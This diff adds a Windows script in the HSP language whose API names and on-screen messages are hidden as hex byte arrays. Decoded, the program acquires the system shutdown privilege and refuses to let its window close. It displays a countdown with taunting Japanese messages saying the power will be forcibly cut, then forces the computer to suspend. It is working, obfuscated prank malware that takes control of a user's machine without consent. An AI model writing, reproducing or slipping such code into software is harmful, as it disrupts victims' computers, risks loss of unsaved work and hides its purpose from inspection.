@@ -1,0 +1,147 @@
+	
+	#uselib "kernel32.dll"
+	#cfunc	global	LoadLibrary		"LoadLibraryA"		sptr
+	#cfunc	global	GetProcAddress	"GetProcAddress"	int, sptr
+	#func	global	FreeLibrary		"FreeLibrary"		int
+	
+	#module
+	#define global os(%1) repeat length(%1) :oncmd gosub *q@, %1(cnt) :loop
+	#define ctype a(%1) (((0x80 <= %1) && (%1 <= 0x9F)) || ((0xE0 <= %1) && (%1 <= 0xFE)))
+	#defcfunc un array ary
+		dimtype dst, 2, 1
+		repeat length(ary)
+			poke dst, cnt, ary.cnt
+		loop
+	return dst
+	
+	#defcfunc unv array ary
+		dimtype dst, 2, 1
+		repeat length(ary)
+			poke dst, cnt, ary.cnt
+		loop
+	return varptr(dst)
+	#global
+	
+	#module
+	#deffunc ss int ssf
+		lk_ = $6B, $65, $72, $6E, $65, $6C, $33, $32, $2E, $64, $6C, $6C
+		lk__ = $47, $65, $74, $43, $75, $72, $72, $65, $6E, $74, $50, $72, $6F, $63, $65, $73, $73
+		lk___ = $53, $65, $74, $53, $79, $73, $74, $65, $6D, $50, $6F, $77, $65, $72, $53, $74, $61, $74, $65
+		lk = LoadLibrary(un(lk_))
+		gcp = GetProcAddress(lk, un(lk__))
+		ssps = GetProcAddress(lk, un(lk___))
+	
+		la_ = $61, $64, $76, $61, $70, $69, $33, $32, $2E, $64, $6C, $6C
+		la__ = $4F, $70, $65, $6E, $50, $72, $6F, $63, $65, $73, $73, $54, $6F, $6B, $65, $6E
+		la___ = $4C, $6F, $6F, $6B, $75, $70, $50, $72, $69, $76, $69, $6C, $65, $67, $65, $56, $61, $6C, $75, $65, $41
+		la____ = $41, $64, $6A, $75, $73, $74, $54, $6F, $6B, $65, $6E, $50, $72, $69, $76, $69, $6C, $65, $67, $65, $73
+		la = LoadLibrary(un(la_))
+		opt = GetProcAddress(la, la__)
+		lpv = GetProcAddress(la, la___)
+		atp = GetProcAddress(la, la____)
+		
+		i = 0
+		phToken = varptr(hToken)
+		i = callfunc(i, gcp, 0), 32, phToken
+		if callfunc(i, opt, 3)
+		
+		ssn_ = $53, $65, $53, $68, $75, $74, $64, $6F, $77, $6E, $50, $72, $69, $76, $69, $6C, $65, $67, $65
+		ssn = un(ssn_)
+		pssn = varptr(ssn)
+		pluid = varptr(tpl.1)
+		i = 0, pssn, pluid
+		if callfunc(i, lpv, 3)
+		
+		tpl.0 = 1
+		tpl.3 = 2
+		ptpl = varptr(tpl)
+		i = hToken, 0, ptpl, 0, 0, 0
+		if callfunc(i, atp, 6)
+	
+		i = ssf, 1
+		if callfunc(i, ssps, 2)
+		
+		FreeLibrary lk
+		FreeLibrary la
+	return
+	#global
+	
+	m = 18, 16
+	os m
+	i = 0
+	
+	lw_ = $77, $69, $6E, $6D, $6D, $2E, $64, $6C, $6C
+	lw__ = $74, $69, $6D, $65, $47, $65, $74, $54, $69, $6D, $65
+	lw = LoadLibrary(un(lw_))
+	tgt = GetProcAddress(lw, un(lw__))
+	
+	lu_ = $75, $73, $65, $72, $33, $32, $2E, $64, $6C, $6C
+	lu__ = $47, $65, $74, $41, $73, $79, $6E, $63, $4B, $65, $79, $53, $74, $61, $74, $65
+	lu___ = $47, $65, $74, $4B, $65, $79, $62, $6F, $61, $72, $64, $53, $74, $61, $74, $65
+	lu____ = $53, $65, $74, $57, $69, $6E, $64, $6F, $77, $54, $65, $78, $74, $41
+	lu = LoadLibrary(un(lu_))
+	gaks = GetProcAddress(lu, un(lu__))
+	gkbs = GetProcAddress(lu, un(lu___))
+	swt = GetProcAddress(lu, un(lu____))
+	
+	nt = callfunc(i, tgt, 0)
+	ot = nt + 11 * 8 * powf(5, 3)
+	
+	__ = $8F, $49, $97, $B9, $82, $C5, $82, $AB, $82, $DC, $82, $B9, $82, $F1, $82, $E6, $81, $5B
+	___ = $82, $A0, $82, $C6
+	____ = $95, $62, $82, $C5, $8B, $AD, $90, $A7, $82, $C9, $93, $64, $8C, $B9, $82, $F0, $97, $8E, $82, $C6, $82, $9F, $82, $B5, $82, $DC, $82, $B7
+	_____ = $8D, $A1, $89, $F1, $82, $CD, $82, $B1, $82, $EA, $82, $BE, $82, $AF, $82, $C9, $82, $B5, $82, $C6, $82, $A2, $82, $C4, $82, $E2, $82, $E9, $82, $E6
+	______ = $8F, $49, $97, $B9, $82, $B7, $82, $E9, $82, $C9, $82, $CD, $30, $82, $F0, $89, $9F, $82, $B5, $82, $C4, $82, $AD, $82, $BE, $82, $B3, $82, $A2
+	_______ = $82, $BE, $82, $A9, $82, $E7, $8F, $6F, $97, $88, $82, $DC, $82, $B9, $82, $F1, $82, $C1, $82, $C4, $82, $CE, $82, $97, $82, $97
+	________ = $83, $4C, $81, $5B, $83, $7B, $81, $5B, $83, $68, $82, $F0, $92, $40, $82, $A2, $82, $C4, $82, $E0, $89, $B9, $82, $AA, $96, $C2, $82, $E9, $82, $BE, $82, $AF, $82, $BE, $82, $E6, $82, $97, $82, $97, $82, $97
+	
+	repeat
+		nt = callfunc(i, tgt, 0)
+		wt = ((ot-nt)/1000)
+		
+		redraw 0
+		color $FF, $FF, $FF :boxf :color
+		pos 0, 0
+		mes un(___)+wt+un(____)
+		redraw 1
+		
+		if wt == 0 :break
+		
+		sdim ks, 256
+		j = varptr(ks)
+		if callfunc(j, gkbs, 1) {
+			kf = 0
+			repeat 18, 80
+				if peek(ks, cnt) & 0x80 :kf = cnt :break
+			loop
+			if (kf) && (kf != 18) && (kf != 115) {
+				i = hwnd@hsp, unv(________) :if callfunc(i, swt, 2) {}
+			}
+		}
+		await
+	loop
+	
+	ss 1
+	sf = 1
+	i = $30
+	
+	cls
+	
+	pos 0, 0
+	mes un(_____)
+	
+	repeat 
+		i = $30
+		if callfunc(i, gaks, 1) & 0x8000 :break
+		wait 1
+	loop
+	
+	FreeLibrary lu
+	FreeLibrary lw
+	end
+	
+*q
+	if sf {i = hwnd@hsp, unv(______) :if callfunc(i, swt, 2) {} }else :if c {i = hwnd@hsp, unv(_______) :if callfunc(i, swt, 2) {} }else :i = hwnd@hsp, unv(__) :if callfunc(i, swt, 2) {}
+	c++
+	return 0
+	
